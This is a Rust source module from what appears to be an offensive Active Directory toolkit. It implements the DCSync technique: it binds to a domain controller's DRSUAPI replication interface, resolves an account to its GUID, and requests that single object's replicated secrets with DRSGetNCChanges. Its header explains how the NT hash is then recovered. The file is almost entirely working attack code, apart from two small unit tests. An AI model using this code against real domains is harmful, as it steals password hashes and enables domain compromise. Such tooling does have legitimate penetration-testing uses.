//! DRSUAPI (MS-DRSR) — the directory replication interface used for DCSync.
//!
//! DCSync abuses replication: bind to DRSUAPI over a sign+sealed ncacn_ip_tcp channel
//! (`DRSBind`), then request a single object's secrets with `DRSGetNCChanges`
//! (EXOP_REPL_OBJ). The reply carries the account's attributes with the secrets encrypted
//! under the NTLM session key; a per-RID DES pass then recovers the NT hash.
//!
//! This module marshals the DRS structures by hand on top of [`crate::ndr`]. `DRSBind` is
//! implemented and validated live; `DRSGetNCChanges` builds on the same primitives.

use crate::ndr::{NdrDecoder, NdrEncoder};
use crate::transport::RpcTcp;
use crate::{epm, Result, RpcError, Syntax};
use adhammer_core::sid::Sid;
use adhammer_core::Guid;

/// DRSUAPI interface: e3514235-4b06-11d1-ab04-00c04fc2dcd2 v4.0.
pub fn drsuapi_syntax() -> Syntax {
    Syntax::new("e3514235-4b06-11d1-ab04-00c04fc2dcd2", 4, 0)
}

/// NTDSAPI client GUID (the well-known value every DRS client presents).
const NTDSAPI_CLIENT_GUID: &str = "e24d201a-4fd6-11d1-a3da-0000f875ae0d";

pub mod opnum {
    pub const DRS_BIND: u16 = 0;
    pub const DRS_GET_NC_CHANGES: u16 = 3;
    pub const DRS_CRACK_NAMES: u16 = 12;
}

// DS_NAME_FORMAT (MS-DRSR 4.1.4.1.3).
const DS_NT4_ACCOUNT_NAME: u32 = 2;
const DS_UNIQUE_ID_NAME: u32 = 6; // "{objectGUID}"

// DRS_EXTENSIONS_INT dwFlags bits we advertise — enough for a V8 request / V6 reply with
// strong (session-key) encryption of the returned secrets.
const DRS_EXT_BASE: u32 = 0x0000_0001;
const DRS_EXT_STRONG_ENCRYPTION: u32 = 0x0000_8000;
const DRS_EXT_GETCHGREQ_V8: u32 = 0x0100_0000;
const DRS_EXT_GETCHGREPLY_V6: u32 = 0x0400_0000;

/// Parse a "{guid}" (or bare guid) string into the 16-byte DCE wire layout.
fn parse_guid_braced(s: &str) -> Result<[u8; 16]> {
    let t = s.trim().trim_start_matches('{').trim_end_matches('}');
    Guid::parse(t).map(|g| g.0).ok_or_else(|| RpcError::Protocol(format!("bad GUID '{s}'")))
}

/// Build the DRS_EXTENSIONS_INT rgb payload (the bytes that follow `cb`).
fn drs_extensions_rgb() -> Vec<u8> {
    let mut v = Vec::new();
    let flags = DRS_EXT_BASE | DRS_EXT_STRONG_ENCRYPTION | DRS_EXT_GETCHGREQ_V8 | DRS_EXT_GETCHGREPLY_V6;
    v.extend_from_slice(&flags.to_le_bytes()); // dwFlags
    v.extend_from_slice(&[0u8; 16]); // SiteObjGuid
    v.extend_from_slice(&0u32.to_le_bytes()); // Pid
    v.extend_from_slice(&0u32.to_le_bytes()); // dwReplEpoch
    v.extend_from_slice(&0u32.to_le_bytes()); // dwFlagsExt
    v.extend_from_slice(&[0u8; 16]); // ConfigObjGUID
    v.extend_from_slice(&0xffff_ffffu32.to_le_bytes()); // dwExtCaps
    v
}

/// An established DRS session: the sealed RPC connection plus the server-returned handle.
pub struct DrsSession {
    rpc: RpcTcp,
    handle: [u8; 20],
}

impl DrsSession {
    /// Resolve DRSUAPI's dynamic port via the endpoint mapper, open a sign+sealed session,
    /// and `DRSBind` to obtain the replication handle.
    pub async fn bind(
        host: &str,
        domain: &str,
        user: &str,
        password: &str,
    ) -> Result<Self> {
        let port = epm::resolve_port(host, drsuapi_syntax()).await?;
        let mut rpc = RpcTcp::connect(&format!("{host}:{port}")).await?;
        rpc.bind_sealed(drsuapi_syntax(), domain, user, password, "ADHAMMER").await?;

        // IDL_DRSBind(puuidClientDsa [unique], pextClient [unique]) → (ppextServer, phDrs, ret)
        let mut e = NdrEncoder::new();
        e.referent(); // puuidClientDsa: non-null unique pointer
        e.uuid(&Guid::parse(NTDSAPI_CLIENT_GUID).expect("client GUID").0);
        e.referent(); // pextClient: non-null unique pointer to DRS_EXTENSIONS
        let rgb = drs_extensions_rgb();
        let cb = rgb.len() as u32;
        e.u32(cb); // conformant max_count (rgb is [size_is(cb)])
        e.u32(cb); // cb
        e.bytes(&rgb);
        while e.len() % 4 != 0 {
            e.u8(0);
        }
        let resp = rpc.call_sealed(opnum::DRS_BIND, &e.into_bytes()).await?;

        // Reply: ppextServer [ref] → DRS_EXTENSIONS, phDrs (20-byte context handle), retval.
        let mut d = NdrDecoder::new(&resp);
        let _server_ext_ref = d.u32()?;
        let _max = d.u32()?;
        let server_cb = d.u32()? as usize;
        let _server_rgb = d.read_bytes(server_cb)?;
        while d.position() % 4 != 0 {
            d.u8()?;
        }
        let handle: [u8; 20] = d.read_bytes(20)?.try_into().unwrap();
        let retval = d.u32().unwrap_or(0);
        if retval != 0 {
            return Err(RpcError::Protocol(format!("DRSBind failed: 0x{retval:08x}")));
        }
        Ok(DrsSession { rpc, handle })
    }

    pub fn handle(&self) -> &[u8; 20] {
        &self.handle
    }

    /// DRSCrackNames: resolve `DOMAIN\name` (NT4 format) to the target's objectGUID.
    /// Uses the V1 request/reply. Returns the 16-byte GUID (DCE wire layout).
    pub async fn crack_name_to_guid(&mut self, netbios_domain: &str, name: &str) -> Result<[u8; 16]> {
        let offered = format!("{netbios_domain}\\{name}");
        let mut e = NdrEncoder::new();
        e.bytes(&self.handle); // hDrs context handle (20 bytes, [ref])
        e.u32(1); // dwInVersion = 1
        // pmsgIn [ref, switch_is(1)] → non-encapsulated union: switch value then the V1 arm.
        e.u32(1); // union discriminant = 1
        e.u32(0); // CodePage
        e.u32(0); // LocaleId
        e.u32(0); // dwFlags
        e.u32(DS_NT4_ACCOUNT_NAME); // formatOffered
        e.u32(DS_UNIQUE_ID_NAME); // formatDesired
        e.u32(1); // cNames
        e.referent(); // rpNames (embedded pointer to the array)
        e.u32(1); // conformant max_count of the pointer array
        e.referent(); // rpNames[0] (pointer to the string)
        e.conformant_varying_wstr(&offered);
        let resp = self.rpc.call_sealed(opnum::DRS_CRACK_NAMES, &e.into_bytes()).await?;

        // Reply: pdwOutVersion (u32), then DRS_MSG_CRACKREPLY union (switch=1) → DS_NAME_RESULTW*
        //   { cItems, [ref] rItems* → [ cItems × { status u32, pDomain wstr*, pName wstr* } ] }
        let mut d = NdrDecoder::new(&resp);
        let _out_version = d.u32()?;
        let _union_switch = d.u32()?;
        let _presult_ref = d.u32()?; // pResult [ref] referent
        let c_items = d.u32()?;
        let _ritems_ref = d.u32()?; // rItems [ref] referent
        let _max = d.u32()?; // conformant max_count of the item array
        if c_items == 0 {
            return Err(RpcError::Protocol("CrackNames returned no items".into()));
        }
        // Item array: fixed fields first (status + two string referents), then the strings.
        let status = d.u32()?;
        let dom_ref = d.u32()?;
        let name_ref = d.u32()?;
        if status != 0 {
            return Err(RpcError::Protocol(format!("CrackNames status {status} (name not found?)")));
        }
        if dom_ref != 0 {
            let _dom = d.conformant_varying_wstr()?;
        }
        if name_ref == 0 {
            return Err(RpcError::Protocol("CrackNames: no cracked name returned".into()));
        }
        let cracked = d.conformant_varying_wstr()?; // "{guid}"
        parse_guid_braced(&cracked)
    }

    /// DRSGetNCChanges V8, single-object (EXOP_REPL_OBJ): replicate exactly the target
    /// object identified by `guid`. Returns the raw reply stub for attribute extraction.
    pub async fn get_nc_changes(&mut self, guid: &[u8; 16]) -> Result<Vec<u8>> {
        const EXOP_REPL_OBJ: u32 = 6;
        let mut e = NdrEncoder::new();
        e.bytes(&self.handle); // hDrs (20)
        e.u32(8); // dwInVersion
        e.u32(8); // union discriminant
        e.align(8); // the V8 arm has u64 members → 8-byte aligned after the discriminant

        // DRS_MSG_GETCHGREQ_V8 — fixed part (embedded pointer pointees are deferred).
        e.uuid(&[0u8; 16]); // uuidDsaObjDest
        e.uuid(&[0u8; 16]); // uuidInvocIdSrc
        e.referent(); // pNC (non-null)
        e.u64(0); // usnvecFrom.usnHighObjUpdate
        e.u64(0); // usnvecFrom.usnReserved
        e.u64(0); // usnvecFrom.usnHighPropUpdate
        e.null_ptr(); // pUpToDateVecDest
        e.u32(0); // ulFlags
        e.u32(1); // cMaxObjects
        e.u32(0); // cMaxBytes
        e.u32(EXOP_REPL_OBJ); // ulExtendedOp
        e.u64(0); // liFsmoInfo
        e.null_ptr(); // pPartialAttrSet
        e.null_ptr(); // pPartialAttrSetEx
        e.u32(0); // PrefixTableDest.PrefixCount
        e.null_ptr(); // PrefixTableDest.pPrefixEntry

        // Deferred: pNC pointee = DSNAME (conformant struct; StringName max_count first).
        e.u32(1); // StringName conformant max_count (NameLen + terminating null)
        e.u32(58); // structLen
        e.u32(0); // SidLen
        e.uuid(guid); // Guid (the target)
        e.bytes(&[0u8; 28]); // Sid
        e.u32(0); // NameLen
        e.u16(0); // StringName[0] = NUL
        while e.len() % 4 != 0 {
            e.u8(0);
        }

        let resp = self.rpc.call_sealed(opnum::DRS_GET_NC_CHANGES, &e.into_bytes()).await?;
        if std::env::var("ADH_DEBUG").is_ok() {
            eprintln!("[dbg] DRSGetNCChanges reply {} bytes, head: {}", resp.len(),
                resp.iter().take(96).map(|b| format!("{b:02x}")).collect::<String>());
        }
        Ok(resp)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extensions_rgb_shape() {
        let rgb = drs_extensions_rgb();
        assert_eq!(rgb.len(), 52); // dwFlags+SiteObjGuid+Pid+ReplEpoch+FlagsExt+ConfigObjGUID+ExtCaps
        let flags = u32::from_le_bytes(rgb[0..4].try_into().unwrap());
        assert_eq!(flags & DRS_EXT_GETCHGREPLY_V6, DRS_EXT_GETCHGREPLY_V6);
        assert_eq!(flags & DRS_EXT_STRONG_ENCRYPTION, DRS_EXT_STRONG_ENCRYPTION);
    }

    #[test]
    fn syntax_uuid_parses() {
        let s = drsuapi_syntax();
        assert_eq!(s.ver_major, 4);
        assert_ne!(s.uuid, [0u8; 16]);
    }
}
